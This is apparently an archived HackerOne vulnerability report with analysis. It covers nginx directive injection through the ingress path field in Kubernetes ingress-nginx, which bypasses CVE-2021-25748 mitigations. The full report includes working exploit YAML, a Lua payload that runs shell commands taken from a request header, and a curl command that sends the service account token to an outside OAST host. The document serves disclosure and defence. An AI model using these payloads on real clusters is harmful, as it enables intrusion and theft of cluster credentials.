# Arbitrary File Read and Code Execution in Ingress-nginx via Path Parameter Injection

## Metadata
- **Source:** HackerOne
- **Report:** 2701701 | https://hackerone.com/reports/2701701
- **Submitted:** 2024-09-05
- **Reporter:** fisjkars
- **Program:** Kubernetes/ingress-nginx
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Nginx Directive Injection, Arbitrary File Upload, Arbitrary File Read, Remote Code Execution, Lua Code Injection, Path Traversal
- **CVEs:** CVE-2021-25748
- **Category:** memory-binary

## Summary
An attacker with ingress creation/modification permissions in a multi-tenant Kubernetes cluster can inject arbitrary nginx directives through the path parameter to bypass CVE-2021-25748 mitigations. By chaining file upload via client_body_in_file_only directive with Lua code injection via set_by_lua_block, an attacker achieves RCE on the ingress controller and can exfiltrate sensitive data including service account tokens.

## Attack scenario
1. Attacker with tenant namespace permissions creates an ingress with path parameter containing client_body_in_file_only directive to enable file uploads to /tmp/nginx/
2. Attacker sends POST request with malicious Lua configuration containing set_by_lua_block directive that executes shell commands from custom HTTP headers
3. Malicious Lua code is written to ingress controller filesystem as temporary nginx configuration file
4. Attacker creates second ingress with path parameter using include directive to load the uploaded malicious configuration file
5. Attacker sends HTTP request with custom pathinjection header containing shell command to read /var/run/secrets/kubernetes.io/serviceaccount/token
6. Lua block executes command and returns service account token via X-My-Var response header, compromising cluster authentication

## Root cause
The ingress path parameter parsing is insufficiently restrictive, allowing injection of arbitrary nginx directives. The mitigation for CVE-2021-25748 blocked direct lua execution but failed to prevent two-stage exploitation using file upload followed by file inclusion. The client_body_in_file_only directive and include directives are not properly sanitized from user-controlled input.

## Attacker mindset
An insider threat or compromised tenant in a multi-tenant cluster seeks to escalate privileges by exfiltrating the ingress controller's service account token, which provides cluster-wide authentication. The attacker recognizes that direct Lua injection is blocked and crafts a sophisticated two-stage exploit that circumvents the existing mitigations through legitimate (but dangerous) nginx features.

## Defensive takeaways
- Implement strict allowlist-based validation of all ingress annotations and path parameters, rejecting any containing nginx directives
- Disable or restrict dangerous nginx directives like client_body_in_file_only, include, and set_by_lua_block in ingress controller configurations
- Apply comprehensive input sanitization to prevent injection of any nginx configuration syntax in user-controlled fields
- Use network policies and RBAC to restrict ingress controller's ability to access sensitive paths like /var/run/secrets/
- Run ingress controller with minimal filesystem permissions and prevent write access to shared temporary directories
- Implement audit logging for all ingress object creations and modifications, alerting on suspicious directive patterns
- Consider running ingress controller in a restrictive seccomp or AppArmor profile to limit command execution capabilities
- Validate and test all mitigations for bypass techniques including multi-stage exploitation chains
- Regularly scan ingress configurations for known dangerous patterns and enforce policies at admission controller level

## Variant hunting
Search for similar injection points in: API Gateway path parameters, reverse proxy routing rules, load balancer configuration parsing, service mesh sidecar injection templates, and any user-controlled input that reaches nginx/HAProxy configuration generation. Look for other directive injection vectors like proxy_pass manipulation, location block injection, or server block injection that might bypass existing filters.

## MITRE ATT&CK
- T1190
- T1027
- T1083
- T1021
- T1552.007
- T1553.006
- T1578
- T1613

## Notes
This vulnerability represents a critical bypass of CVE-2021-25748 mitigations. The two-stage exploit is sophisticated and demonstrates that blocking one injection vector (direct Lua) is insufficient if related dangerous features remain accessible. The ability to chain client_body_in_file_only with include directives creates an effective RCE primitive. Service account token exfiltration has cascading impact on cluster security. This requires immediate patching across all ingress-nginx deployments.

## Full report
<details><summary>Expand</summary>

The objective of an Ingress Controller is to act as a gatekeeper for all incoming traffic to a Kubernetes cluster. It is responsible for routing and managing traffic coming into the cluster from external sources, allowing for efficient and secure communication between the cluster and the outside world. 

An attacker in a multi-tenant cluster with permission to create/modify ingresses can inject content into the connection-proxy-header annotation and read arbitrary files from the ingress controller (including the service account).

The `path` parameter allows users to specify which HTTP path of the given host should be redirected to the ingress's defined backend, as the `path` parameter is permissive, it is possible to inject arbitrary nginx directives when creating a new ingress. 

As a few restrictions are in place due to one of the mitigations of [CVE-2021-25748](https://github.com/kubernetes/kubernetes/issues/126814) in the corresponding inspector for ingresses, it is not possible to execute code trivially by using the `by_lua` functions, to circumvent this protection we can proceed using a two-stages exploit : 

* We first create an ingress abusing the nginx directive `client_body_in_file_only` in order to upload the body of an HTTP POST request to the ingress's filesystem.
* We send an HTTP POST request to this ingress, with an nginx configuration using the `set_by_lua_block` directive
* Then we create a second ingress that will include this uploaded file
* Finally, we send a last request to abuse the included configuration and execute code on the ingress controller

Stage one, ingress allowing file upload to `/tmp/nginx/f292392` : 
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  annotations:
    kubernetes.io/ingress.class: nginx
  name: f292392-research
  namespace: default
spec:
  rules:
  - host: f292392.com
    http:
      paths:
      - backend:
          service:
            name: legitimate-service
            port:
              number: 80
        path: |-
          /f292392body/ {
          limit_except POST              { deny all; }
          client_body_temp_path          /tmp/nginx/f292392;
          client_body_in_file_only       on;
          client_body_buffer_size        128K;
          #
        pathType: Prefix
```

We then send a POST request to the ingress that will upload a malicious nginx configuration to the ingress controller (you should replace the IP address with your own ingress controller's IP) : 

```sh
curl http://f292392.com/f292392body/ --resolve f292392.com:80:4.178.145.81 -k -vv --data-binary '@./exploit.txt'
```

Where `exploit.txt` is our malicious configuration : 

```
set_by_lua_block $my_var { 
            local rsfile = io.popen(ngx.req.get_headers()["pathinjection"]);
            local rschar = rsfile:read("*all");ngx.say(rschar); 
            return rschar;
} 
proxy_set_header X-My-Var $my_var;
```

Now that the file is uploaded, we can create a new ingress that imports it (since we cannot be sure what the exact filename will be, we can use a wildcard character to include this configuration, as we should be the only having queried this ingress : 

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  annotations:
    kubernetes.io/ingress.class: nginx
  name: f292392-research
  namespace: default
spec:
  rules:
  - host: f292392.com
    http:
      paths:
      - backend:
          service:
            name: legitimate-service
            port:
              number: 80
        path: |-
          /rcewithhost/ {
          include /tmp/nginx/f292392/*;
  
          #
        pathType: Prefix
```

Using the `set_by_lua_block` directive we set the $my_var variable to the output of the shell command found in the `pathinjection` header, this var is then set as the `X-My-Var` header.

With the following curl command, we can now retrieve the serviceaccount's token : 

```
curl http://f292392.com/rcewithhost/ --resolve f292392.com:80:4.178.145.81 -k -H "pathinjection: curl -F 'file=@/var/run/secrets/kubernetes.io/serviceaccount/token' http://hdyy6lwp6kifbu1cv7euclvuyl4cs3gs.oastify.com.oastify.com"
```

{F3577415}

We now get an HTTP request with the content of the token : 
{F3577417}

Here the content of `nginx.conf` and the uploaded file after the exploit :
{F3577418}

{F3577426}

## Impact

An attacker in a multi-tenant cluster with permission to create/modify ingresses can inject content into the connection-proxy-header annotation and read arbitrary files from the ingress controller (including the service account).

</details>

---
*Analysed by Claude on 2026-05-24*
